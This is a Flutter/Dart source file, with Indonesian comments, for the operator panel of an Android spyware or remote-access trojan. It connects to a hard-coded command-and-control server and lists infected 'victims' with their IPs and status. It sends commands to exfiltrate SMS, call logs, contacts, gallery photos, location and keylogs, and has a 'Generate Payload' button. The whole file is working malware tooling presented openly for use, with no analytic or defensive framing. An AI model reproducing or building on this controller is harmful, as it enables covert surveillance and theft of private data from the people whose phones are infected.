import 'dart:async';
import 'dart:convert';
import 'dart:ui';
import 'package:flutter/material.dart';
import 'package:http/http.dart' as http;

class SpywarePage extends StatefulWidget {
  final String sessionKey;
  final String username;

  const SpywarePage({
    super.key,
    required this.sessionKey,
    required this.username,
  });

  @override
  State<SpywarePage> createState() => _SpywarePageState();
}

class _SpywarePageState extends State<SpywarePage> with TickerProviderStateMixin {
  // --- KONFIGURASI DOMAIN PANEL ---
  final String baseUrl = "http://arullll.private-rexy.web.id:11235";

  // --- TEMA WARNA SPYWARE (PINK CYBERPUNK) ---
  final Color primaryDark = const Color(0xFF050505);
  final Color cardBg = const Color(0xFF0F0F0F);
  final Color accentPrimary = const Color(0xFFFF00FF); // Magenta
  final Color accentSecondary = const Color(0xFF00F0FF); // Cyan
  final Color accentRed = const Color(0xFFFF2A2A);
  final Color textMain = Colors.white;
  final Color textSub = Colors.white54;

  List<dynamic> _targets = [];
  bool _isLoading = true;
  Timer? _pollingTimer;

  late AnimationController _listAnimController;

  @override
  void initState() {
    super.initState();
    _listAnimController = AnimationController(
      vsync: this,
      duration: const Duration(milliseconds: 800),
    );

    _fetchTargets();

    // Auto-refresh setiap 10 detik
    _pollingTimer = Timer.periodic(const Duration(seconds: 10), (timer) {
      if (mounted) _fetchTargets(isBackground: true);
    });
  }

  @override
  void dispose() {
    _pollingTimer?.cancel();
    _listAnimController.dispose();
    super.dispose();
  }

  // --- FUNGSI API: AMBIL TARGET ---
  Future<void> _fetchTargets({bool isBackground = false}) async {
    if (!isBackground) setState(() => _isLoading = true);

    try {
      // Endpoint bisa disesuaikan, misal: /getSpyTargets
      final response = await http.get(
        Uri.parse("http://arullll.private-rexy.web.id:11235/api/rat/getVictims?key=${widget.sessionKey}"),
      ).timeout(const Duration(seconds: 10));

      if (response.statusCode == 200) {
        final data = jsonDecode(response.body);
        final List list = data is List ? data : (data['victims'] ?? data['data'] ?? []);
        
        if (mounted) {
          setState(() {
            _targets = list;
            _isLoading = false;
            if (!isBackground) _listAnimController.forward();
          });
        }
      } else {
        if (!isBackground && mounted) setState(() => _isLoading = false);
      }
    } catch (e) {
      if (!isBackground && mounted) setState(() => _isLoading = false);
    }
  }

  // --- FUNGSI API: REQUEST DATA SPYWARE ---
  Future<void> _requestData(String deviceId, String dataType) async {
    Navigator.pop(context); // Tutup sheet
    _showSnackBar("Requesting $dataType...", success: true);

    try {
      await http.post(
        Uri.parse("http://arullll.private-rexy.web.id:11235/api/rat/sendCommand"),
        body: {
          "key": widget.sessionKey,
          "device_id": deviceId,
          "command": "spy_$dataType", // Contoh: spy_sms, spy_contacts
        },
      );
    } catch (e) {
      _showSnackBar("Failed to send request", success: false);
    }
  }

  void _showSnackBar(String message, {required bool success}) {
    if (!mounted) return;
    ScaffoldMessenger.of(context).showSnackBar(
      SnackBar(
        content: Row(
          children: [
            Icon(success ? Icons.visibility : Icons.error_outline, color: success ? accentSecondary : accentRed, size: 18),
            const SizedBox(width: 10),
            Text(message, style: const TextStyle(color: Colors.white, fontFamily: 'ShareTechMono')),
          ],
        ),
        backgroundColor: cardBg,
        behavior: SnackBarBehavior.floating,
        shape: RoundedRectangleBorder(borderRadius: BorderRadius.circular(12)),
        margin: const EdgeInsets.all(20),
      ),
    );
  }

  @override
  Widget build(BuildContext context) {
    return Scaffold(
      backgroundColor: primaryDark,
      appBar: _buildAppBar(),
      body: _buildBody(),
      floatingActionButton: _buildFAB(),
    );
  }

  PreferredSizeWidget _buildAppBar() {
    return AppBar(
      backgroundColor: Colors.transparent,
      elevation: 0,
      centerTitle: true,
      leading: IconButton(
        icon: Icon(Icons.arrow_back_ios_new, color: textMain),
        onPressed: () => Navigator.pop(context),
      ),
      title: Row(
        mainAxisSize: MainAxisSize.min,
        children: [
          Icon(Icons.center_focus_strong, color: accentPrimary, size: 22),
          const SizedBox(width: 8),
          ShaderMask(
            shaderCallback: (bounds) => LinearGradient(colors: [accentPrimary, Colors.pink.shade300]).createShader(bounds),
            child: const Text(
              "SPYWARE",
              style: TextStyle(fontSize: 20, fontWeight: FontWeight.w900, color: Colors.white, letterSpacing: 2),
            ),
          ),
        ],
      ),
    );
  }

  Widget _buildBody() {
    return Column(
      children: [
        _buildHeader(),
        Expanded(
          child: _isLoading
              ? Center(child: CircularProgressIndicator(color: accentPrimary))
              : _targets.isEmpty
                  ? _buildEmptyState()
                  : _buildTargetList(),
        ),
      ],
    );
  }

  Widget _buildHeader() {
    int activeCount = _targets.where((t) => (t['status'] ?? '').toLowerCase() == 'online').length;
    
    return Container(
      margin: const EdgeInsets.all(16),
      padding: const EdgeInsets.all(20),
      decoration: BoxDecoration(
        color: Colors.white.withOpacity(0.03),
        borderRadius: BorderRadius.circular(20),
        border: Border.all(color: accentPrimary.withOpacity(0.2)),
      ),
      child: Row(
        mainAxisAlignment: MainAxisAlignment.spaceBetween,
        children: [
          Column(
            crossAxisAlignment: CrossAxisAlignment.start,
            children: [
              Text("Total Targets", style: TextStyle(color: textSub, fontSize: 12)),
              Text("${_targets.length} Devices", style: TextStyle(color: textMain, fontSize: 22, fontWeight: FontWeight.bold)),
            ],
          ),
          Container(
            padding: const EdgeInsets.symmetric(horizontal: 12, vertical: 6),
            decoration: BoxDecoration(
              color: Colors.green.withOpacity(0.2),
              borderRadius: BorderRadius.circular(30),
              border: Border.all(color: Colors.green.withOpacity(0.5)),
            ),
            child: Row(
              children: [
                CircleAvatar(backgroundColor: Colors.green, radius: 4),
                const SizedBox(width: 8),
                Text("$activeCount Active", style: TextStyle(color: Colors.green, fontWeight: FontWeight.bold)),
              ],
            ),
          )
        ],
      ),
    );
  }

  Widget _buildEmptyState() {
    return Center(
      child: Column(
        mainAxisAlignment: MainAxisAlignment.center,
        children: [
          Icon(Icons.remove_red_eye_outlined, color: Colors.white24, size: 60),
          const SizedBox(height: 20),
          Text("No Targets Infiltrated", style: TextStyle(color: textSub, fontSize: 16)),
          const SizedBox(height: 8),
          Text("Waiting for payload execution...", style: TextStyle(color: Colors.white24, fontSize: 12)),
        ],
      ),
    );
  }

  Widget _buildTargetList() {
    return ListView.builder(
      padding: const EdgeInsets.only(bottom: 100, left: 16, right: 16),
      itemCount: _targets.length,
      itemBuilder: (context, index) {
        final target = _targets[index];
        bool isActive = (target['status'] ?? '').toString().toLowerCase() == 'online';
        
        return SlideTransition(
          position: Tween<Offset>(begin: const Offset(1, 0), end: Offset.zero).animate(
            CurvedAnimation(parent: _listAnimController, curve: Interval((index * 0.1).clamp(0.0, 1.0), 1.0, curve: Curves.easeOut)),
          ),
          child: _buildTargetCard(target, isActive),
        );
      },
    );
  }

  Widget _buildTargetCard(Map<String, dynamic> target, bool isActive) {
    String name = target['device'] ?? target['model'] ?? 'Unknown';
    String ip = target['ip'] ?? '0.0.0.0';
    String id = target['device_id'] ?? target['id'] ?? 'null';
    Color statusColor = isActive ? Colors.green : Colors.grey;

    return GestureDetector(
      onTap: () => _showActionSheet(id, name),
      child: Container(
        margin: const EdgeInsets.only(bottom: 12),
        padding: const EdgeInsets.all(16),
        decoration: BoxDecoration(
          color: cardBg,
          borderRadius: BorderRadius.circular(16),
          border: Border.all(color: Colors.white.withOpacity(0.05)),
          boxShadow: [BoxShadow(color: Colors.black.withOpacity(0.4), blurRadius: 10, offset: const Offset(0, 4))],
        ),
        child: Row(
          children: [
            // Indikator
            Container(
              width: 8,
              height: 50,
              decoration: BoxDecoration(
                color: statusColor,
                borderRadius: BorderRadius.circular(4),
                boxShadow: [BoxShadow(color: statusColor.withOpacity(0.5), blurRadius: 8)],
              ),
            ),
            const SizedBox(width: 16),
            Expanded(
              child: Column(
                crossAxisAlignment: CrossAxisAlignment.start,
                children: [
                  Text(name, style: TextStyle(color: textMain, fontWeight: FontWeight.bold, fontSize: 16)),
                  const SizedBox(height: 4),
                  Text(ip, style: TextStyle(color: accentSecondary, fontFamily: 'ShareTechMono', fontSize: 12)),
                ],
              ),
            ),
            Icon(Icons.keyboard_arrow_right, color: Colors.white24),
          ],
        ),
      ),
    );
  }

  Widget _buildFAB() {
    return FloatingActionButton.extended(
      onPressed: () {
        // Fungsi generate payload
        _showSnackBar("Generating payload link...", success: true);
      },
      label: const Text("Generate Payload"),
      icon: const Icon(Icons.link),
      backgroundColor: accentPrimary.withOpacity(0.2),
      foregroundColor: accentPrimary,
      shape: RoundedRectangleBorder(borderRadius: BorderRadius.circular(12)),
    );
  }

  // --- BOTTOM SHEET ACTIONS ---
  void _showActionSheet(String deviceId, String name) {
    showModalBottomSheet(
      context: context,
      backgroundColor: Colors.transparent,
      builder: (_) => BackdropFilter(
        filter: ImageFilter.blur(sigmaX: 5, sigmaY: 5),
        child: Container(
          padding: const EdgeInsets.all(24),
          decoration: BoxDecoration(
            color: primaryDark,
            borderRadius: const BorderRadius.vertical(top: Radius.circular(30)),
            border: Border.all(color: Colors.white.withOpacity(0.1)),
          ),
          child: Column(
            mainAxisSize: MainAxisSize.min,
            children: [
              Container(width: 40, height: 4, decoration: BoxDecoration(color: Colors.grey[700], borderRadius: BorderRadius.circular(10))),
              const SizedBox(height: 20),
              Text(name, style: TextStyle(color: textMain, fontSize: 18, fontWeight: FontWeight.bold)),
              Text("Select data to exfiltrate", style: TextStyle(color: textSub, fontSize: 12)),
              const SizedBox(height: 30),
              Row(
                mainAxisAlignment: MainAxisAlignment.spaceAround,
                children: [
                  _buildSpyButton(Icons.message, "SMS", accentPrimary, () => _requestData(deviceId, "sms")),
                  _buildSpyButton(Icons.call, "Call Logs", Colors.orange, () => _requestData(deviceId, "calls")),
                  _buildSpyButton(Icons.contacts, "Contacts", Colors.blue, () => _requestData(deviceId, "contacts")),
                ],
              ),
              const SizedBox(height: 20),
              Row(
                mainAxisAlignment: MainAxisAlignment.spaceAround,
                children: [
                  _buildSpyButton(Icons.folder, "Gallery", Colors.purple, () => _requestData(deviceId, "gallery")),
                  _buildSpyButton(Icons.location_on, "Location", Colors.redAccent, () => _requestData(deviceId, "location")),
                  _buildSpyButton(Icons.key, "Keylogs", Colors.yellow, () => _requestData(deviceId, "keylogger")),
                ],
              ),
              const SizedBox(height: 20),
            ],
          ),
        ),
      ),
    );
  }

  Widget _buildSpyButton(IconData icon, String label, Color color, VoidCallback onTap) {
    return GestureDetector(
      onTap: onTap,
      child: Column(
        children: [
          Container(
            padding: const EdgeInsets.all(16),
            decoration: BoxDecoration(
              shape: BoxShape.circle,
              color: color.withOpacity(0.1),
              border: Border.all(color: color.withOpacity(0.3)),
            ),
            child: Icon(icon, color: color, size: 24),
          ),
          const SizedBox(height: 8),
          Text(label, style: TextStyle(color: textSub, fontSize: 11)),
        ],
      ),
    );
  }
}